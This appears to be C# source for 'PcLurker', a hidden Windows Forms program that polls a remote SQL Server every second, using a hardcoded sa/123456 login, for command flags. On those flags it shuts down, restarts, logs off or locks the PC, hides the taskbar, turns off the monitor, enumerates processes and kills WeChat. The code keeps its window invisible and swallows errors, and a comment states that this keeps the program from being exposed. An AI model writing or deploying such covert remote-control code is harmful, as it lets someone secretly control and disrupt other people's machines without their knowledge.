using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PcLurker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            System.Timers.Timer t = new System.Timers.Timer(1000);//实例化Timer类，设置间隔时间为1000毫秒；
            t.Elapsed += new System.Timers.ElapsedEventHandler(queryData);//到达时间的时候执行事件；
            t.AutoReset = true;//设置是执行一次（false）还是一直执行(true)；
            t.Enabled = true;//是否执行System.Timers.Timer.Elapsed事件；
          
            this.timer1.Enabled = true;
            this.timer1.Interval = 100;

            //窗体隐藏运行
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            SetVisibleCore(false);
        }

        private bool[] isRun = { false ,false,false,false,false,false,false,false};
        public static string[] status = { "","","","","","","",""};


        //全局进程数组
        Process[] processes;
        //dataGridView的数据源
        DataTable dt = new DataTable();

        /// <summary>
        /// 查询数据库，启动线程
        /// </summary>
        /// <param name="source"></param>
        /// <param name="e"></param>
        public void queryData(object source, System.Timers.ElapsedEventArgs e)
        {
            Thread newThread = new Thread(new ThreadStart(getData));
            //加上这句话，否则在关闭窗体时会出现如下错误：在创建窗口句柄之前，不能在控件上调用 Invoke 或 BeginInvoke。
            newThread.IsBackground = true;
            newThread.Start();
        }

        /// <summary>
        /// 查询数据库的方法
        /// </summary>
        private void getData()
        {
            try
            {
                //连接数据库
                string connStr = "Data Source =192.168.31.87; User ID = sa; Password = 123456; Initial Catalog =info";//Data Source改为实际的主机IP
                SqlConnection conn = new SqlConnection(connStr);//创建连接对象
                if (conn.State == ConnectionState.Closed)//判断数据库连接的状态
                    conn.Open(); DataSet ds = new DataSet();//实例化
                SqlDataAdapter adapter = new SqlDataAdapter();////创建数据适配器
                string sqlStr = "SELECT * FROM command";//sql字符串
                SqlCommand comm = new SqlCommand(sqlStr, conn);
                adapter.SelectCommand = comm;
                adapter.Fill(ds, "command");//将按照条件查出来的Teachers表中信息填充到ds中

                this.Invoke((EventHandler)(delegate
                {
                    this.dataGridView1.DataSource = ds.Tables["command"];
                    //不显示出dataGridView1的最后一行空白   
                    this.dataGridView1.AllowUserToAddRows = false;
                }));

                //关闭数据库的连接
                conn.Close();
                //释放数据库的连接
                conn.Dispose();
            }

            catch
            {
                //空，即使连接SQL失败也不提示报错，避免程序暴露。
            }

            finally
            {
                //status[N]依次对应dataGridView各列
                status[0] = dataGridView1.Rows[0].Cells[0].Value.ToString();
                status[1] = dataGridView1.Rows[0].Cells[1].Value.ToString();
                status[2] = dataGridView1.Rows[0].Cells[2].Value.ToString();
                status[3] = dataGridView1.Rows[0].Cells[3].Value.ToString();
                status[4] = dataGridView1.Rows[0].Cells[4].Value.ToString();
                status[5] = dataGridView1.Rows[0].Cells[5].Value.ToString();
                status[6] = dataGridView1.Rows[0].Cells[6].Value.ToString();
                status[7] = dataGridView1.Rows[0].Cells[7].Value.ToString();

                if (status[0] == "1")
                {
                    if (!isRun[0])
                    {
                        isRun[0] = true;
                        pcControl.hideTaskbar();
                        //代码只执行一次
                    }
                }
                if (status[0] == "0")
                {
                    pcControl.showTaskbar();
                    isRun[0] = false;
                }

                if (status[1] == "1")
                {
                    pcControl.ShutDown();
                }
                if (status[2] == "1")
                {
                    pcControl.Restart();
                }
                if (status[3] == "1")
                {
                    pcControl.LogOff();
                }
                if (status[4] == "1")
                {
                    pcControl.LockPC();
                }

                if (status[5] == "1")
                {
                    if (!isRun[5])
                    {
                        isRun[5] = true;
                        pcControl.Turnoffmonitor();
                        //代码只执行一次
                    }
                }

                if (status[5] == "0")
                {
                    pcControl.Turnonmonitor();
                    isRun[5] = false;
                    //代码只执行一次
                }

                if (status[6] == "1")
                {
                    if (!isRun[6])
                    {
                        isRun[6] = true;
                        pcControl.change();
                        //代码只执行一次
                    }

                }
                if (status[6] == "0")
                {
                   isRun[6] = false;
                }


                if (status[7] == "1")
                {
                    if(!isRun[7])
                    {
                        isRun[7] = true;
                        getProcess();
                        Delay(2000);
                        ////代码只执行一次
                    }
                }
                if (status[7] == "0")
                {
                    isRun[7] = false;
                }

            }
        }



        private void timer1_Tick(object sender, EventArgs e)
        {
            this.dataGridView2.Refresh();
        }

        /// <summary>
        /// 获取进程的方法
        /// </summary>
        private void getProcess()
        {
            //给datatable添加3个列
            dt.Columns.Add("ID", typeof(Int32));
            dt.Columns.Add("进程名", typeof(String));
            dt.Columns.Add("进程分配内存", typeof(String));

            //获得所有进程
            processes = System.Diagnostics.Process.GetProcesses();
            foreach (Process p in processes)
            {
                DataRow dr = dt.NewRow();
                dr[0] = p.Id;
                dr[1] = p.ProcessName;
                dr[2] = p.PrivateMemorySize64 / 1024 + " KB";

                dt.Rows.Add(dr);
            }

            this.Invoke((EventHandler)(delegate
            {
                //绑定进程信息到dataGridView
                this.dataGridView2.DataSource = dt;
                //不显示出dataGridView1的最后一行空白   
                this.dataGridView2.AllowUserToAddRows = false;
            }));
        }

        /// <summary>
        /// 杀死进程的方法
        /// </summary>
        private void killProcess()
        {
            ///TODO灵活杀死指定进程
            foreach (Process p in processes)
            {
                //if (p.Id == Convert.ToInt32(this.dataGridView2.CurrentRow.Cells[0].Value))//p.Id根据ID号杀死进程。
                if (p.ProcessName== "WeChat")// p.ProcessNam根据进程名杀死进程，此处修改为自己想要杀死的进程。
                {
                    p.Kill();                
                    break;
                }
            }
          /*  processes = System.Diagnostics.Process.GetProcesses();
            dt.Clear();

            this.Invoke((EventHandler)(delegate
            {
                this.dataGridView2.DataSource = dt;

            foreach (Process p in processes)
            {
                DataRow dr = dt.NewRow();
                dr[0] = p.Id;
                dr[1] = p.ProcessName + ".exe";
                dr[2] = p.PrivateMemorySize64 / 1024 + " KB";
                dt.Rows.Add(dr);
            }
           
                this.dataGridView2.DataSource = dt;
                //不显示出dataGridView1的最后一行空白   
                this.dataGridView2.AllowUserToAddRows = false;
            }));*/
        }

        /// <summary>
        /// 延迟执行杀死进程的方法
        /// </summary>
        /// <param name="milliSecond"></param>
        public void Delay(int milliSecond)
        {
            int i = 0;
            int start = Environment.TickCount;
            while (Math.Abs(Environment.TickCount - start) < milliSecond)//毫秒
            {
                if (i == 0)
                {
                    killProcess();
                    i++;
                }
                if(i>=1)
                {
                    i = 1;
                }
                Application.DoEvents();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Environment.Exit(0); //所有线程强制退出。
        }
    }
}
